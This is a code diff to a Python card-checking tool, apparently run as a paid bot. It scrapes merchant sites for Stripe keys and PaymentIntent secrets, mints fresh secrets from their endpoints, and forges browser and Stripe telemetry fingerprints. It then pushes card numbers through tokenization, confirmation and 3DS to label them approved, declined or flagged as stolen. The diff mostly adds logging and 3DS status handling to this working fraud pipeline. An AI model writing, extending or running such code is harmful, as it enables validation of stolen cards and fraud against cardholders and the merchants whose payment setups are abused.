@@ -15,6 +15,7 @@ from curl_cffi.requests import AsyncSession
 import config
 import gate_client as gc
 from setup_gate import bin_alpha2, bin_lookup
+import pusto_logger as log
 
 sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
 
@@ -47,21 +48,26 @@ class ConfirmGateSession:
         s = AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=self.proxy)
         try:
             r = await s.get(self.target, timeout=15)
+            log.log_http("GET", self.target, r.status_code, proxy=self.proxy)
             if r.status_code != 200:
                 await _close(s)
+                log.log_error("confirm_gate", f"GET target HTTP {r.status_code}: {self.target}")
                 return False, f"GET target HTTP {r.status_code}"
             html = r.text
             if gc.is_cloudflare_challenge(html):
                 await _close(s)
+                log.log_warn(f"[confirm_gate] Cloudflare challenge on target page {self.target}")
                 return False, "Cloudflare challenge on target page"
 
             self.pk = gc.extract_pk_live(html)
             secrets = gc.extract_client_secrets(html)
-            if not self.pk or (not secrets and not gc.detect_secret_mints(html, self.target)):
+            self.mints = gc.detect_secret_mints(html, self.target)
+            log.log_target("confirm_gate", self.target, f"pk={self.pk[:16] if self.pk else 'NONE'}... secrets={len(secrets)} mints={len(self.mints)}")
+            if not self.pk or (not secrets and not self.mints):
                 await _close(s)
+                log.log_error("confirm_gate", f"pk_live missing / no secret and no mint endpoint: {self.target}")
                 return False, "pk_live missing / no secret and no mint endpoint"
 
-            self.mints = gc.detect_secret_mints(html, self.target)
             self.s = s
 
             # beacon-mint живых fingerprint-ID для телеметрии
@@ -72,10 +78,12 @@ class ConfirmGateSession:
                                    headers={"Origin": "https://js.stripe.com",
                                             "Referer": "https://js.stripe.com/", "Accept": "*/*"},
                                    timeout=6)
+                log.log_http("POST", "https://m.stripe.com/6", r_m.status_code, proxy=self.proxy)
                 if r_m.status_code == 200:
                     live_ids = gc.parse_m_stripe_response(r_m.json())
-            except Exception:
-                pass
+                    log.log_stripe("BEACON", f"muid={live_ids.get('muid')[:10]}...", "OK")
+            except Exception as e:
+                log.log_warn(f"[confirm_gate] m.stripe beacon mint failed: {e}")
             self.telem = gc.stripe_telemetry(self.target, self.pk,
                                              muid=live_ids["muid"], sid=live_ids["sid"])
             if live_ids["guid"]:
@@ -94,51 +102,58 @@ class ConfirmGateSession:
             return True, ""
         except Exception as e:
             await _close(s)
+            log.log_error("confirm_gate", f"open exception on {self.target}", e)
             return False, f"{type(e).__name__}: {e}"
 
     async def _adopt_secret(self, secret: str) -> tuple[bool, str]:
         """Разведка PI перед боем: жив ли секрет и безопасна ли сумма."""
         info = await gc.stripe_retrieve_pi(self.s, self.pk, secret)
         if info is None:
+            log.log_stripe("ADOPT_SECRET", secret[:20] + "...", "FAIL", "client_secret dead or retrieve failed")
             return False, "client_secret dead or retrieve failed"
         amount = int(info.get("amount") or 0)
         if info.get("status") != "requires_payment_method":
+            log.log_stripe("ADOPT_SECRET", secret[:20] + "...", "FAIL", f"status={info.get('status')} — not reusable")
             return False, f"PI status={info.get('status')} — secret not reusable"
         self.charge_risk = amount > self.max_amount
         self.pi_info = info
         self.secret = secret
         self.confirm_count = 0
         risk = " [CHARGE_RISK!]" if self.charge_risk else ""
-        print(f"    [i] PI adopted: {amount} {info.get('currency')} "
-              f"capture={info.get('capture_method')}{risk}", flush=True)
+        log.log_stripe("ADOPT_SECRET", secret[:20] + "...", "OK", f"amount={amount} {info.get('currency')} capture={info.get('capture_method')}{risk}")
         return True, ""
 
     async def _refresh_secret(self) -> bool:
         """Исчерпали/убили секрет → пробуем минтнуть новый с найденных эндпоинтов."""
         while self.mint_idx < len(self.mints):
             ep = self.mints[self.mint_idx]
+            log.log_stripe("MINT_SECRET", ep, "ATTEMPT")
             try:
                 r = await self.s.post(ep, data={}, timeout=10)
+                log.log_http("POST", ep, r.status_code, proxy=self.proxy)
                 txt = r.text
                 m = gc.RE_CLIENT_SECRET.search(txt)
                 if m:
                     ok, _ = await self._adopt_secret(m.group(1))
                     if ok:
-                        print(f"    [+] Minted fresh secret via {ep}", flush=True)
+                        log.log_stripe("MINT_SECRET", ep, "SUCCESS", f"secret={m.group(1)[:20]}...")
                         return True
-            except Exception:
-                pass
+            except Exception as e:
+                log.log_warn(f"[confirm_gate] mint error on {ep}: {e}")
             self.mint_idx += 1
+        log.log_stripe("MINT_SECRET", None, "EXHAUSTED", "no live mint endpoint")
         return False
 
     async def check_card(self, card_raw: str, bin_alpha2: str = "US") -> dict:
+        pan_masked = gc.mask_pan(card_raw)
         # Sprint 2.4 guard: чужой PI дороже MAX_PI_AMOUNT_CENTS не подтверждаем —
         # это реальная авторизация на сумму товара, а не $0-auth (README §confirm_gate)
         if self.charge_risk and self.pi_info:
+            log.log_warn(f"[confirm_gate] charge risk blocked for {pan_masked}: PI amount {self.pi_info.get('amount')} > {self.max_amount}")
             return {"card": card_raw, "status": "ERROR",
                     "detail": (f"CHARGE_RISK: PI {self.pi_info.get('amount')} "
-                               f"{self.pi_info.get('currency', '')} > cap "
-                               f"{self.max_amount}c — confirm blocked"),
+                                f"{self.pi_info.get('currency', '')} > cap "
+                                f"{self.max_amount}c — confirm blocked"),
                     "retry_next_gate": False}
         card = gc.parse_card(card_raw)
         telem = dict(self.telem)
@@ -148,18 +163,23 @@ class ConfirmGateSession:
         try:
             r_tok = await self.s.post("https://api.stripe.com/v1/payment_methods",
                                       data=tok_body, headers=gc.TOKENIZE_HEADERS, timeout=10)
+            log.log_http("POST", "https://api.stripe.com/v1/payment_methods", r_tok.status_code, proxy=self.proxy)
             tok_data = r_tok.json()
         except Exception as e:
+            log.log_error("confirm_gate", f"Stripe tokenize network error for {pan_masked}", e)
             return {"card": card_raw, "status": "ERROR",
                     "detail": f"Stripe tokenize error: {e}", "retry_next_gate": False}
         if "id" not in tok_data:
             code = tok_data.get("error", {}).get("code", "tokenize_error")
             msg = tok_data.get("error", {}).get("message", "")
+            log.log_stripe("TOKENIZE_FAIL", pan_masked, code, msg)
             return {"card": card_raw, "status": gc.classify_verdict(f"{msg} {code}"),
                     "detail": msg or code, "retry_next_gate": False}
         pm_id = tok_data["id"]
+        log.log_stripe("TOKENIZE_OK", pm_id, detail=pan_masked)
 
         if self.confirm_count >= MAX_CONFIRMS_PER_SECRET:
+            log.log_stripe("BUDGET_EXHAUSTED", f"count={self.confirm_count}/{MAX_CONFIRMS_PER_SECRET}", "REFRESHING")
             if not await self._refresh_secret():
                 return {"card": card_raw, "status": "ERROR",
                         "detail": "confirm budget exhausted, no live mint endpoint",
@@ -168,6 +188,7 @@ class ConfirmGateSession:
         resp = await gc.stripe_confirm_pi(self.s, self.pk, self.secret, pm_id,
                                           self.target, telem)
         verdict, detail = gc.classify_pi_verdict(resp)
+        log.log_stripe("CONFIRM_PI", pm_id, verdict, str(detail)[:80])
 
         if verdict in ("APPROVED@CVV", "APPROVED@CCN", "INVALID", "EXPIRED",
                        "DECLINED", "DECLINED@STOLEN", "DECLINED@FRAUD",
@@ -181,6 +202,7 @@ class ConfirmGateSession:
                     "detail": detail, "retry_next_gate": True}
 
         if verdict == "3DS_REDIRECT" and detail:
+            log.log_stripe("3DS_REDIRECT", detail[:60], "FOLLOWING")
             follow = await gc.stripe_3ds_follow_redirect(self.s, detail)
             low = (follow.get("html") or "").lower()
             if "succeeded" in low or "payment complete" in low or "thank you" in low:
@@ -193,8 +215,10 @@ class ConfirmGateSession:
             sdk = na.get("use_stripe_sdk") or {}
             src = sdk.get("source") or sdk.get("three_d_secure_source") or ""
             if src:
+                log.log_stripe("3DS_AUTH", src[:25], "START")
                 ares = await gc.stripe_3ds2_authenticate(self.s, self.pk, src)
                 ts = ares.get("transStatus")
+                log.log_stripe("3DS_AUTH", src[:25], f"transStatus={ts}")
                 if ts == "Y":
                     verdict, detail = "3DS_FRICTIONLESS", "transStatus=Y (no user step)"
                     # frictionless прошёл — PI мог перейти в succeeded
@@ -203,8 +227,16 @@ class ConfirmGateSession:
                         verdict, detail = "APPROVED", f"3DS2 frictionless -> {info}"
                 elif ts == "C":
                     verdict, detail = "3DS_CHALLENGE", "карта жива, enrolled в 3DS (нужен OTP)"
+                elif ts in ("N", "R"):
+                    # согласовано с hit_gate._classify_and_resolve_3ds:
+                    # N/R — эмитент не аутентифицировал, это отказ, не сбой движка
+                    verdict, detail = "DECLINED", f"3DS2 rejected (transStatus={ts})"
+                elif ts == "A":
+                    verdict, detail = "3DS_CHALLENGE", f"3DS2 proof attempted (transStatus=A)"
                 else:
-                    verdict, detail = "3DS_FAILED", json.dumps(ares.get("raw"))[:150]
+                    # пустой/неизвестный transStatus — движковый сбой аутентификации:
+                    # вердикт таксономичен и возвращает кредит (ERROR = refund в боте)
+                    verdict, detail = "ERROR", f"3DS2 authenticate failed: {json.dumps(ares.get('raw'))[:120]}"
 
         return {"card": card_raw, "status": verdict, "detail": str(detail)[:250],
                 "retry_next_gate": False}
